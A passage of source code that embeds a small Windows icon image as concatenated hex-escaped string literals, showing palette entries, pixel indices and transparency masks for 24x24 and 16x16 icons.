e\\x2e\\x29\\x26\\x26\\x57\\xb6\\x1d\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00".\r\n"\\x00\\x00\\x00\\x1c\\x9f\\x9a\\x4d\\x3d\\x3d\\x3e\\x3d\\x3d\\x3d\\x3e\\x39\\x2e\\x2e\\x2e\\x29\\x31".\r\n"\\x92\\x9f\\x1d\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x76\\x61\\xb6\\x9a".\r\n"\\x59\\x3e\\x3a\\x3e\\x39\\x39\\x2e\\x2e\\x2e\\x54\\x96\\xb6\\x61\\x76\\x00\\x00\\x00\\x00\\x00\\x00".\r\n"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x70\\x5f\\x8c\\xbb\\xac\\x96\\x7b\\x7b\\x96\\xaa".\r\n"\\xb6\\x8c\\x5f\\x71\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00".\r\n"\\x00\\x00\\x00\\x00\\x00\\x71\\x1e\\x1e\\x1d\\x1d\\x1e\\x1d\\x70\\x00\\x00\\x00\\x00\\x00\\x00\\x00".\r\n"\\x00\\x00\\x00\\x00\\x00\\xff\\xf0\\x0f\\xff\\xff\\x80\\x01\\xff\\xfe\\x00\\x00\\x7f\\xfc\\x00\\x00".\r\n"\\x3f\\xf8\\x00\\x00\\x1f\\xf0\\x00\\x00\\x0f\\xe0\\x00\\x00\\x07\\xc0\\x00\\x00\\x03\\xc0\\x00\\x00".\r\n"\\x03\\x80\\x00\\x00\\x01\\x80\\x00\\x00\\x01\\x80\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00".\r\n"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00".\r\n"\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x01\\x80\\x00\\x00\\x01\\x80\\x00\\x00\\x01\\xc0\\x00\\x00".\r\n"\\x03\\xc0\\x00\\x00\\x03\\xe0\\x00\\x00\\x07\\xf0\\x00\\x00\\x0f\\xf8\\x00\\x00\\x1f\\xfc\\x00\\x00".\r\n"\\x3f\\xfe\\x00\\x00\\x7f\\xff\\x80\\x01\\xff\\xff\\xf0\\x0f\\xff\\x28\\x00\\x00\\x00\\x18\\x00\\x00".\r\n"\\x00\\x30\\x00\\x00\\x00\\x01\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x40\\x02\\x00\\x00\\x00\\x00\\x00".\r\n"\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\xa2\\x6b\\x00".\r\n"\\x00\\xa3\\x6c\\x00\\x00\\xa5\\x6e\\x00\\x00\\xa7\\x70\\x00\\x00\\xa9\\x71\\x00\\x00\\xad\\x75\\x00".\r\n"\\x00\\xb0\\x77\\x00\\x00\\xb1\\x78\\x00\\x00\\xb4\\x7a\\x00\\x00\\xb6\\x7c\\x01\\x00\\xb8\\x7e\\x00".\r\n"\\x00\\xa7\\x73\\x10\\x00\\xae\\x79\\x10\\x00\\xaa\\x78\\x18\\x00\\xae\\x7c\\x18\\x00\\xba\\x80\\x00".\r\n"\\x00\\xbd\\x82\\x00\\x00\\xbf\\x84\\x00\\x00\\xbf\\x87\\x0b\\x00\\xbb\\x86\\x17\\x00\\xbb\\x87\\x1a".\r\n"\\x00\\xbd\\x89\\x19\\x00\\xb0\\x80\\x25\\x00\\xbc\\x8b\\x24\\x00\\xb0\\x83\\x2b\\x00\\xba\\x8b\\x2b".\r\n"\\x00\\xb2\\x86\\x30\\x00\\xb4\\x87\\x30\\x00\\xb6\\x8a\\x31\\x00\\xbb\\x8e\\x31\\x00\\xc0\\x85\\x00".\r\n"\\x00\\xc3\\x88\\x01\\x00\\xc5\\x8a\\x00\\x00\\xca\\x8d\\x00\\x00\\xcc\\x8f\\x01\\x00\\xc2\\x89\\x08".\r\n"\\x00\\xcd\\x90\\x01\\x00\\xcc\\x92\\x08\\x00\\xd0\\x93\\x00\\x00\\xd3\\x95\\x00\\x00\\xd4\\x97\\x01".\r\n"\\x00\\xd6\\x98\\x00\\x00\\xd8\\x9a\\x00\\x00\\xda\\x9c\\x00\\x00\\xdd\\x9e\\x00\\x00\\xd0\\x95\\x0a".\r\n"\\x00\\xd2\\x99\\x0f\\x00\\xc8\\x92\\x12\\x00\\xcc\\x95\\x12\\x00\\xcb\\x97\\x1b\\x00\\xca\\x96\\x1c".\r\n"\\x00\\xd2\\x9b\\x1a\\x00\\xde\\xa0\\x00\\x00\\xdf\\xa1\\x05\\x00\\xde\\xa5\\x13\\x00\\xd6\\xa0\\x18".\r\n"\\x00\\xe1\\xa2\\x00\\x00\\xe3\\xa4\\x01\\x00\\xe5\\xa5\\x00\\x00\\xe8\\xa7\\x00\\x00\\xe7\\xa8\\x02".\r\n"\\x00\\xea\\xaa\\x00\\x00\\xec\\xab\\x00\\x00\\xed\\xac\\x01\\x00\\xf0\\xae\\x00\\x00\\xee\\xb0\\x0d".\r\n"\\x00\\xf2\\xb1\\x00\\x00\\xf4\\xb2\\x00\\x00\\xf6\\xb4\\x00\\x00\\xf9\\xb6\\x00\\x00\\xfb\\xb8\\x00".\r\n"\\x00\\xfc\\xb9\\x01\\x00\\xfb\\xbb\\x0a\\x00\\xe0\\xa8\\x13\\x00\\xe8\\xaf\\x1b\\x00\\xeb\\xb1\\x18".\r\n"\\x00\\xc1\\x90\\x27\\x00\\xc9\\x99\\x2c\\x00\\xcb\\x9c\\x30\\x00\\xcc\\x9e\\x33\\x00\\xc9\\x9b\\x37".\r\n"\\x00\\xcb\\x9d\\x38\\x00\\xd5\\xa3\\x2c\\x00\\xce\\xa1\\x3c\\x00\\xd6\\xa6\\x34\\x00\\xdf\\xaf\\x36".\r\n"\\x00\\xe7\\xb3\\x2d\\x00\\xe8\\xb3\\x2a\\x00\\xe6\\xb6\\x36\\x00\\xe0\\xb1\\x3a\\x00\\xfd\\xc4\\x22".\r\n"\\x00\\xb8\\x8f\\x41\\x00\\xb9\\x90\\x42\\x00\\xbf\\x96\\x42\\x00\\xd3\\xa7\\x43\\x00\\xcb\\xa8\\x5f".\r\n"\\x00\\xd7\\xb0\\x56\\x00\\xde\\xb6\\x55\\x00\\xe6\\xb9\\x45\\x00\\xea\\xbd\\x45\\x00\\xe5\\xbd\\x5b".\r\n"\\x00\\xc4\\xa2\\x62\\x00\\xc6\\xa4\\x62\\x00\\xc5\\xa4\\x66\\x00\\xcc\\xaa\\x63\\x00\\xc6\\xa6\\x68".\r\n"\\x00\\xc9\\xa9\\x6e\\x00\\xd5\\xb2\\x65\\x00\\xdc\\xb9\\x66\\x00\\xc9\\xaa\\x70\\x00\\xe1\\xbd\\x65".\r\n"\\x00\\xed\\xc0\\x46\\x00\\xfa\\xcb\\x48\\x00\\xec\\xc2\\x54\\x00\\xe4\\xc0\\x65\\x00\\xed\\xc8\\x66".\r\n"\\x00\\xe5\\xc2\\x6d\\x00\\xec\\xcd\\x7e\\x00\\xf2\\xd2\\x7a\\x00\\xf7\\xd6\\x79\\x00\\xcf\\xb3\\x80".\r\n"\\x00\\xcf\\xb4\\x80\\x00\\xd0\\xb5\\x81\\x00\\xd2\\xb8\\x88\\x00\\xd5\\xbb\\x88\\x00\\xd5\\xbd\\x8f".\r\n"\\x00\\xd5\\xbd\\x90\\x00\\xdc\\xc1\\x85\\x00\\xd9\\xc1\\x91\\x00\\xdd\\xc5\\x92\\x00\\xe3\\xc8\\x8b".\r\n"\\x00\\xee\\xd3\\x8d\\x00\\xf1\\xd4\\x87\\x00\\xf4\\xd7\\x89\\x00\\xe7\\xcd\\x91\\x00\\xe5\\xcd\\x94".\r\n"\\x00\\xeb\\xd1\\x90\\x00\\xeb\\xd3\\x95\\x00\\xeb\\xd4\\x9b\\x00\\xec\\xd6\\x9f\\x00\\xfb\\xe3\\x9c".\r\n"\\x00\\xdd\\xc9\\xa1\\x00\\xef\\xdb\\xa9\\x00\\xe7\\xd6\\xb5\\x00\\xe8\\xd8\\xb8\\x00\\xf1\\xe2\\xbe".\r\n"\\x00\\xf6\\xe7\\xbe\\x00\\xf9\\xe8\\xbb\\x00\\xec\\xe0\\xc7\\x00\\xef\\xe4\\xcf\\x00\\xf6\\xe9\\xc5".\r\n"\\x00\\xf3\\xe6\\xc9\\x00\\xf3\\xe7\\xcc\\x00\\xf7\\xea\\xc9\\x00\\xf9\\xed\\xca\\x00\\xf2\\xe7\\xd0".\r\n"\\x00\\xf2\\xe8\\xd2\\x00\\xfe\\xf3\\xd1\\x00\\xf3\\xed\\xe1\\x00\\xf4\\xed\\xe1\\x00\\xf4\\xef\\xe4".\r\n"\\x00\\xf6\\xf0\\xe2\\x00\\xf7\\xf2\\xe7\\x00\\xf8\\xf2\\xe6\\x00\\xfa\\xf4\\xe6\\x00\\xfc\\xf7\\xe8".\r\n"\\x00\\xfe\\xfa\\xed\\x00\\xfb\\xf8\\xf3\\x00\\xfc\\xfa\\xf2\\x00\\xfc\\xfa\\xf6\\x00\\xfd\\xfb\\xf8".\r\n"\\x00\\xfd\\xfd\\xfa\\x00\\xfe\\xfe\\xfe\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00".\r\n"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00".\r\n"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00".\r\n"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00".\r\n"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00".\r\n"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00".\r\n"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00".\r\n"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00".\r\n"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00".\r\n"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00".\r\n"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00".\r\n"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00".\r\n"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00".\r\n"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00".\r\n"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00".\r\n"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00".\r\n"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xff\\xff\\xff\\x00\\x00\\x00\\x00".\r\n"\\x00\\x00\\x00\\x00\\x00\\x00\\x66\\x66\\x6e\\x6b\\x66\\x66\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00".\r\n"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x66\\x7b\\x7f\\x66\\x1d\\x0c\\x0c\\x1d\\x66\\x7f\\x79\\x66\\x00".\r\n"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x6e\\x7d\\x0f\\x04\\x04\\x04\\x04\\x04\\x04\\x04".\r\n"\\x01\\x0f\\x7c\\x6e\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x7f\\x1a\\x04\\x0a".\r\n"\\x0a\\x0a\\x0a\\x0a\\x07\\x07\\x04\\x04\\x04\\x04\\x04\\x01\\x19\\x7d\\x00\\x00\\x00\\x00\\x00\\x6e".\r\n"\\x95\\x18\\x0a\\x0a\\x0a\\x0a\\x0a\\x0a\\x0a\\x0a\\x0a\\x0a\\x04\\x04\\x04\\x04\\x04\\x5c\\x6e\\x00".\r\n"\\x00\\x00\\x66\\x90\\xaa\\xaa\\x80\\x13\\x11\\x1f\\x1f\\x1f\\x11\\x11\\x0a\\x0a\\x16\\x91\\xa4\\xa0".\r\n"\\xa0\\xa0\\xa0\\x6a\\x00\\x00\\x7b\\x16\\x51\\xa4\\xad\\xa2\\x61\\x21\\x21\\x21\\x21\\x21\\x1f\\x52".\r\n"\\xa4\\xad\\xad\\xad\\xad\\x8e\\x17\\x79\\x00\\x00\\x82\\x11\\x1f\\x33\\x99\\xad\\xad\\x92\\x53\\x25".\r\n"\\x23\\x23\\x6d\\xaa\\xad\\xad\\xad\\xa8\\x60\\x04\\x04\\x7f\\x00\\x66\\x6c\\x1f\\x21\\x23\\x2e\\x8f".\r\n"\\xad\\xad\\xad\\x89\\x38\\x8b\\xad\\xad\\xad\\xad\\x9c\\x4d\\x0a\\x04\\x04\\x67\\x66\\x66\\x51\\x23".\r\n"\\x23\\x25\\x29\\x2b\\x76\\xad\\xad\\xad\\xad\\xad\\xad\\xad\\xad\\x88\\x24\\x0a\\x0a\\x0a\\x04\\x1d".\r\n"\\x6a\\x6e\\x30\\x23\\x25\\x29\\x2b\\x35\\x39\\x72\\xaa\\xad\\xad\\xad\\xad\\xaa\\x62\\x23\\x21\\x11".\r\n"\\x0a\\x0a\\x04\\x0d\\x6b\\x6b\\x30\\x25\\x29\\x35\\x39\\x39\\x3d\\x77\\xad\\xad\\xad\\xad\\xad\\xad".\r\n"\\x75\\x25\\x23\\x1f\\x11\\x0a\\x07\\x0d\\x6b\\x66\\x55\\x29\\x2b\\x39\\x39\\x4c\\x94\\xad\\xad\\xad".\r\n"\\xad\\xaa\\xad\\xad\\xad\\x8b\\x2e\\x1f\\x11\\x0a\\x0a\\x1d\\x67\\x66\\x75\\x29\\x2b\\x39\\x70\\xa6".\r\n"\\xad\\xad\\xad\\xad\\x78\\x42\\x86\\xaa\\xad\\xad\\x99\\x33\\x11\\x0a\\x0a\\x69\\x6a\\x00\\x88\\x2b".\r\n"\\x39\\x86\\xad\\xad\\xad\\xad\\xa6\\x71\\x44\\x41\\x3d\\x58\\x93\\xad\\xad\\xa4\\x54\\x0a\\x0a\\x82".\r\n"\\x00\\x00\\x7b\\x5a\\x9a\\xad\\xad\\xad\\xad\\x9e\\x5b\\x47\\x44\\x44\\x3d\\x3d\\x35\\x65\\xa4\\xad".\r\n"\\xad\\x6c\\x15\\x79\\x00\\x00\\x66\\xa3\\x9a\\x9b\\x9b\\x9b\\x8d\\x49\\x47\\x47\\x44\\x44\\x3d\\x3c".\r\n"\\x2b\\x2b\\x2f\\x87\\xad\\xad\\x96\\x66\\x00\\x00\\x00\\x6e\\x63\\x39\\x3d\\x44\\x44\\x44\\x47\\x44".\r\n"\\x44\\x44\\x3d\\x39\\x39\\x29\\x27\\x21\\x4f\\x9c\\x6e\\x00\\x00\\x00\\x00\\x00\\x82\\x58\\x3d\\x3d".\r\n"\\x44\\x44\\x44\\x44\\x3d\\x3d\\x3d\\x39\\x2b\\x27\\x25\\x21\\x4f\\x7d\\x00\\x00\\x00\\x00\\x00\\x00".\r\n"\\x00\\x82\\x64\\x3d\\x3d\\x3d\\x41\\x41\\x3d\\x3d\\x39\\x39\\x2b\\x27\\x23\\x5f\\x7f\\x00\\x00\\x00".\r\n"\\x00\\x00\\x00\\x00\\x00\\x00\\x6e\\x86\\x4c\\x3d\\x3c\\x3d\\x3d\\x39\\x39\\x2b\\x27\\x34\\x83\\x6e".\r\n"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x6a\\x7b\\x8a\\x74\\x59\\x4a\\x37\\x56\\x73".\r\n"\\x88\\x7b\\x6a\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x66\\x6a".\r\n"\\x6b\\x6b\\x6a\\x66\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xff\\x81\\xff\\x00\\xfc\\x00\\x3f".\r\n"\\x00\\xf8\\x00\\x1f\\x00\\xf0\\x00\\x0f\\x00\\xe0\\x00\\x07\\x00\\xc0\\x00\\x03\\x00\\x80\\x00\\x01".\r\n"\\x00\\x80\\x00\\x01\\x00\\x80\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00".\r\n"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x01\\x00\\x80\\x00\\x01".\r\n"\\x00\\x80\\x00\\x01\\x00\\xc0\\x00\\x03\\x00\\xe0\\x00\\x07\\x00\\xf0\\x00\\x0f\\x00\\xf8\\x00\\x1f".\r\n"\\x00\\xfc\\x00\\x3f\\x00\\xff\\x81\\xff\\x00\\x28\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x20\\x00\\x00".\r\n"\\x00\\x01\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00".\r\n"\\x00\\x00\\x01\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\xa2\\x6b\\x00\\x00\\xa3\\x6c\\x00".\r\n"\\x00\\xa5\\x6d\\x00\\x00\\xa7\\x70\\x00\\x00\\xa9\\x72\\x00\\x00\\xad\\x74\\x00\\x00\\xb0\\x77\\x00".\r\n"\\x00\\xb1\\x78\\x00\\x00\\xb4\\x7a\\x00\\x00\\xb6\\x7c\\x00\\x00\\xb9\\x7f\\x00\\x00\\xbb\\x81\\x00".\r\n"\\x00\\xbd\\x83\\x00\\x00\\xbb\\x85\\x11\\x00\\xb1\\x84\\x2d\\x00\\xb4\\x86\\x2d\\x00\\xb5\\x88\\x2d".\r\n"\\x00\\xbc\\x91\\x3a\\x00\\xc0\\x85\\x00\\x00\\xc5\\x8a\\x01\\x00\\xc9\\x8d\\x00\\x00\\xc6\\x8e\\x0c".\r\n"\\x00\\xcd\\x90\\x00\\x00\\xcf\\x94\\x04\\x00\\xc9\\x91\\x0b\\x00\\xd0\\x93\\x00\\x00\\xd3\\x96\\x00".\r\n"\\x00\\xd6\\x98\\x00\\x00\\xd8\\x9a\\x00\\x00\\xda\\x9c\\x00\\x00\\xdc\\x9e\\x00\\x00\\xc4\\x8d\\x12".\r\n"\\x00\\xcf\\x98\\x13\\x00\\xdf\\xa0\\x00\\x00\\xe0\\xa1\\x00\\x00\\xe5\\xa5\\x00\\x00\\xe6\\xa8\\x04".\r\n"\\x00\\xe9\\xa8\\x00\\x00\\xed\\xad\\x00\\x00\\xf0\\xae\\x00\\x00\\xf3\\xb2\\x00\\x00\\xf5\\xb3\\x00".\r\n"\\x00\\xf7\\xb5\\x00\\x00\\xf6\\xb6\\x05\\x00\\xfc\\xb9\\x00\\x00\\xe8\\xad\\x12\\x00\\xe8\\xb1\\x1f".\r\n"\\x00\\xc4\\x92\\x23\\x00\\xc0\\x91\\x2d\\x00\\xc6\\x96\\x2e\\x00\\xca\\x9b\\x32\\x00\\xd9\\xa7\\x2f".\r\n"\\x00\\xdd\\xab\\x2f\\x00\\xdb\\xab\\x37\\x00\\xea\\xb7\\x30\\x00\\xba\\x92\\x45\\x00\\xc1\\x98\\x46".\r\n"\\x00\\xc1\\x9c\\x58\\x00\\xd2\\xa8\\x47\\x00\\xca\\xa6\\x5a\\x00\\xcf\\xab\\x5c\\x00\\xd0\\xac\\x5c".\r\n"\\x00\\xe6\\xba\\x48\\x00\\xe9\\xbc\\x48\\x00\\xe9\\xbe\\x51\\x00\\xc7\\xa7\\x69\\x00\\xc9\\xa9\\x69".\r\n"\\x00\\xd6\\xb5\\x6b\\x00\\xcb\\xad\\x73\\x00\\xcb\\xad\\x74\\x00\\xcc\\xae\\x76\\x00\\xce\\xb1\\x76".\r\n"\\x00\\xd5\\xb6\\x74\\x00\\xd1\\xb4\\x79\\x00\\xd4\\xb7\\x7d\\x00\\xe0\\xbe\\x6c\\x00\\xfc\\xd3\\x5f".\r\n"\\x00\\xe2\\xc0\\x6d\\x00\\xed\\xc8\\x68\\x00\\xf3\\xce\\x6b\\x00\\xe6\\xc6\\x75\\x00\\xe7\\xc8\\x7c".\r\n"\\x00\\xd0\\xb5\\x81\\x00\\xd2\\xb8\\x87\\x00\\xd2\\xb9\\x88\\x00\\xd7\\xbd\\x89\\x00\\xdb\\xc2\\x90".\r\n"\\x00\\xd8\\xc2\\x98\\x00\\xf4\\xd6\\x87\\x00\\xe3\\xcc\\x99\\x00\\xed\\xd3\\x94\\x00\\xe8\\xd0\\x98".\r\n"\\x00\\xf1\\xd8\\x99\\x00\\xfd\\xe2\\x93\\x00\\xe3\\xcf\\xa2\\x00\\xe9\\xd5\\xa8\\x00\\xea\\xd8\\xaf".\r\n"\\x00\\xed\\xda\\xac\\x00\\xef\\xe0\\xbc\\x00\\xee\\xe1\\xc5\\x00\\xfb\\xec\\xc2\\x00\\xfa\\xec\\xc5".\r\n"\\x00\\xf3\\xe8\\xcc\\x00\\xf4\\xea\\xd3\\x00\\xf6\\xec\\xd2\\x00\\xf4\\xec\\xda\\x00\\xfa\\xf1\\xdb".\r\n"\\x00\\xfd\\xf4\\xdb\\x00\\xfb\\xf3\\xdc\\x00\\xf5\\xee\\xe0\\x00\\xf6\\xf0\\xe6\\x00\\xf7\\xf3\\xeb".\r\n"\\x00\\xf8\\xf3\\xea\\x00\\xfa\\xf6\\xed\\x00\\xfc\\xf8\\xeb\\x00\\xfd\\xf9\\xee\\x00\\xfd\\xfc\\xf9".\r\n"\\x00\\xfe\\xfe\\xfe\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00".\r\n"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00".\r\n"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00".\r\n"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00".\r\n"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00".\r\n"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00".\r\n"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00".\r\n"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00".\r\n"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00".\r\n"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00".\r\n"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00".\r\n"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00".\r\n"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00".\r\n"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00".\r\n"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00".\r\n"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00".\r\n"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00".\r\n"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00".\r\n"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00".\r\n"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00".\r\n"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00".\r\n"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00".\r\n"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00".\r\n"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00".\r\n"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00".\r\n"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00".\r\n"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00".\r\n"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xff\\xff\\xff\\x00\\x00\\x00\\x00\\x00\\x00\\x54\\x47".\r\n"\\x3a\\x3a\\x47\\x54\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x53\\x43\\x11\\x03\\x03\\x03\\x03\\x0f".\r\n"\\x42\\x53\\x00\\x00\\x00\\x00\\x00\\x47\\x39\\x06\\x06\\x06\\x06\\x06\\x04\\x03\\x03\\x38\\x47\\x00".\r\n"\\x00\\x00\\x53\\x57\\x08\\x08\\x0a\\x0a\\x08\\x08\\x08\\x06\\x04\\x03\\x38\\x53\\x00\\x00\\x4b\\x6a".\r\n"\\x64\\x33\\x13\\x13\\x14\\x0d\\x0d\\x49\\x71\\x71\\x6f\\x58\\x00\\x54\\x32\\x20\\x63\\x76\\x5c\\x21".\r\n"\\x15\\x19\\x60\\x76\\x76\\x6e\\x12\\x0f\\x55\\x48\\x13\\x15\\x18\\x5c\\x76\\x72\\x51\\x69\\x76\\x76".\r\n"\\x61\\x0e\\x06\\x06\\x47\\x3c\\x15\\x1a\\x1d\\x22\\x4f\\x76\\x76\\x76\\x76\\x4c\\x14\\x0d\\x08\\x06".\r\n"\\x3a\\x3c\\x18\\x1d\\x23\\x25\\x59\\x76\\x76\\x76\\x76\\x52\\x15\\x0d\\x08\\x07\\x3a\\x48\\x1a\\x1d".\r\n"\\x2f\\x66\\x76\\x76\\x66\\x50\\x73\\x76\\x61\\x19\\x0d\\x07\\x48\\x54\\x35\\x41\\x73\\x76\\x76\\x5e".\r\n"\\x2c\\x28\\x2e\\x5d\\x76\\x69\\x30\\x32\\x54\\x00\\x5f\\x6c\\x6c\\x6c\\x4d\\x2d\\x2c\\x28\\x23\\x22".\r\n"\\x36\\x67\\x72\\x55\\x00\\x00\\x53\\x3f\\x28\\x28\\x2c\\x2c\\x2c\\x28\\x23\\x1d\\x1a\\x14\\x5a\\x53".\r\n"\\x00\\x00\\x00\\x47\\x3f\\x23\\x28\\x28\\x28\\x23\\x23\\x1d\\x18\\x3b\\x47\\x00\\x00\\x00\\x00\\x00".\r\n"\\x53\\x4e\\x37\\x23\\x23\\x23\\x1d\\x34\\x44\\x53\\x00\\x00\\x00\\x0